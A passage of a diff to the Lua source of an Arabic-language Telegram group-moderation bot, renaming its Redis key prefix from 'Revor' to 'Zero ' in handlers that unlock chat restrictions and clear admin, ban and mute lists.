 list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
 for i,lock in pairs(list) do 
-Redis:set(Revor..'Revor:'..lock..UserId[2],"del")    
+Redis:set(Zero ..'Zero :'..lock..UserId[2],"del")    
 end
 LuaTele.answerCallbackQuery(data.id, "⌔︙تم قفل جميع الاوامر بنجاح  ", true)
 end
@@ -12672,175 +12675,175 @@ end
 elseif Text and Text:match('(%d+)/unlock_link') then
 local UserId = Text:match('(%d+)/unlock_link')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Link"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Link"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الروابط").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_spam') then
 local UserId = Text:match('(%d+)/unlock_spam')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Spam"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Spam"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الكلايش").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_keypord') then
 local UserId = Text:match('(%d+)/unlock_keypord')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Keyboard"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Keyboard"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الكيبورد").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_voice') then
 local UserId = Text:match('(%d+)/unlock_voice')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:vico"..ChatId)  
+Redis:del(Zero .."Zero :Lock:vico"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الاغاني").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_gif') then
 local UserId = Text:match('(%d+)/unlock_gif')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Animation"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Animation"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح المتحركات").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_files') then
 local UserId = Text:match('(%d+)/unlock_files')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Document"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Document"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الملفات").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_text') then
 local UserId = Text:match('(%d+)/unlock_text')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:text"..ChatId,true) 
+Redis:del(Zero .."Zero :Lock:text"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الدردشه").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_video') then
 local UserId = Text:match('(%d+)/unlock_video')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Video"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Video"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الفيديو").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_photo') then
 local UserId = Text:match('(%d+)/unlock_photo')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Photo"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Photo"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الصور").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_username') then
 local UserId = Text:match('(%d+)/unlock_username')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:User:Name"..ChatId)  
+Redis:del(Zero .."Zero :Lock:User:Name"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح المعرفات").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_tags') then
 local UserId = Text:match('(%d+)/unlock_tags')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:hashtak"..ChatId)  
+Redis:del(Zero .."Zero :Lock:hashtak"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح التاك").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_bots') then
 local UserId = Text:match('(%d+)/unlock_bots')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Bot:kick"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Bot:kick"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح البوتات").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_fwd') then
 local UserId = Text:match('(%d+)/unlock_fwd')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:forward"..ChatId)  
+Redis:del(Zero .."Zero :Lock:forward"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح التوجيه").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_audio') then
 local UserId = Text:match('(%d+)/unlock_audio')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Audio"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Audio"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الصوت").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_stikear') then
 local UserId = Text:match('(%d+)/unlock_stikear')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Sticker"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Sticker"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الملصقات").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_phone') then
 local UserId = Text:match('(%d+)/unlock_phone')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Contact"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Contact"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الجهات").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_joine') then
 local UserId = Text:match('(%d+)/unlock_joine')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Join"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Join"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الدخول").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_addmem') then
 local UserId = Text:match('(%d+)/unlock_addmem')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:AddMempar"..ChatId)  
+Redis:del(Zero .."Zero :Lock:AddMempar"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الاضافه").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_videonote') then
 local UserId = Text:match('(%d+)/unlock_videonote')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Unsupported"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Unsupported"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح بصمه الفيديو").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_pin') then
 local UserId = Text:match('(%d+)/unlock_pin')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:lockpin"..ChatId) 
+Redis:del(Zero .."Zero :lockpin"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح التثبيت").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_tgservir') then
 local UserId = Text:match('(%d+)/unlock_tgservir')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:tagservr"..ChatId)  
+Redis:del(Zero .."Zero :Lock:tagservr"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الاشعارات").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_markdaun') then
 local UserId = Text:match('(%d+)/unlock_markdaun')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:Markdaun"..ChatId)  
+Redis:del(Zero .."Zero :Lock:Markdaun"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الماركدون").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_edits') then
 local UserId = Text:match('(%d+)/unlock_edits')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:edit"..ChatId) 
+Redis:del(Zero .."Zero :Lock:edit"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح التعديل").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_games') then
 local UserId = Text:match('(%d+)/unlock_games')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Lock:geam"..ChatId)  
+Redis:del(Zero .."Zero :Lock:geam"..ChatId)  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح الالعاب").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unlock_flood') then
 local UserId = Text:match('(%d+)/unlock_flood')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:hdel(Revor.."Revor:Spam:Group:User"..ChatId ,"Spam:User")  
+Redis:hdel(Zero .."Zero :Spam:Group:User"..ChatId ,"Spam:User")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم فتح التكرار").unLock, 'md', true, false, reply_markup)
 end
@@ -12848,74 +12851,74 @@ end
 if Text and Text:match('(%d+)/Developers') then
 local UserId = Text:match('(%d+)/Developers')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Developers:Groups") 
+Redis:del(Zero .."Zero :Developers:Groups") 
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح مطورين البوت", 'md', false)
 end
 elseif Text and Text:match('(%d+)/DevelopersQ') then
 local UserId = Text:match('(%d+)/DevelopersQ')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:DevelopersQ:Groups") 
+Redis:del(Zero .."Zero :DevelopersQ:Groups") 
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح مطورين الثانوين من البوت", 'md', false)
 end
 elseif Text and Text:match('(%d+)/TheBasics') then
 local UserId = Text:match('(%d+)/TheBasics')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:TheBasics:Group"..ChatId) 
+Redis:del(Zero .."Zero :TheBasics:Group"..ChatId) 
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح المنشئين الاساسيين", 'md', false)
 end
 elseif Text and Text:match('(%d+)/TheBasicsQ') then
 local UserId = Text:match('(%d+)/TheBasicsQ')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:TheBasicsQ:Group"..ChatId) 
+Redis:del(Zero .."Zero :TheBasicsQ:Group"..ChatId) 
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح المالكين", 'md', false)
 end
 elseif Text and Text:match('(%d+)/Originators') then
 local UserId = Text:match('(%d+)/Originators')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Originators:Group"..ChatId) 
+Redis:del(Zero .."Zero :Originators:Group"..ChatId) 
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح منشئين المجموعه", 'md', false)
 end
 elseif Text and Text:match('(%d+)/Managers') then
 local UserId = Text:match('(%d+)/Managers')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Managers:Group"..ChatId) 
+Redis:del(Zero .."Zero :Managers:Group"..ChatId) 
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح المدراء", 'md', false)
 end
 elseif Text and Text:match('(%d+)/Addictive') then
 local UserId = Text:match('(%d+)/Addictive')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Addictive:Group"..ChatId) 
+Redis:del(Zero .."Zero :Addictive:Group"..ChatId) 
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح ادمنيه المجموعه", 'md', false)
 end
 elseif Text and Text:match('(%d+)/DelDistinguished') then
 local UserId = Text:match('(%d+)/DelDistinguished')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Distinguished:Group"..ChatId) 
+Redis:del(Zero .."Zero :Distinguished:Group"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح المميزين", 'md', false)
 end
 elseif Text and Text:match('(%d+)/BanAll') then
 local UserId = Text:match('(%d+)/BanAll')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:BanAll:Groups") 
+Redis:del(Zero .."Zero :BanAll:Groups") 
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح المحظورين عام", 'md', false)
 end
 elseif Text and Text:match('(%d+)/ktmAll') then
 local UserId = Text:match('(%d+)/ktmAll')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:ktmAll:Groups") 
+Redis:del(Zero .."Zero :ktmAll:Groups") 
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح المكتومين عام", 'md', false)
 end
 elseif Text and Text:match('(%d+)/BanGroup') then
 local UserId = Text:match('(%d+)/BanGroup')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:BanGroup:Group"..ChatId) 
+Redis:del(Zero .."Zero :BanGroup:Group"..ChatId) 
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح المحظورين", 'md', false)
 end
 elseif Text and Text:match('(%d+)/SilentGroupGroup') then
 local UserId = Text:match('(%d+)/SilentGroupGroup')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:SilentGroup:Group"..ChatId) 
+Redis:del(Zero .."Zero :SilentGroup:Group"..ChatId) 
 LuaTele.editMessageText(ChatId,Msg_id,"⌔︙تم مسح المكتومين", 'md', false)
 end
 end
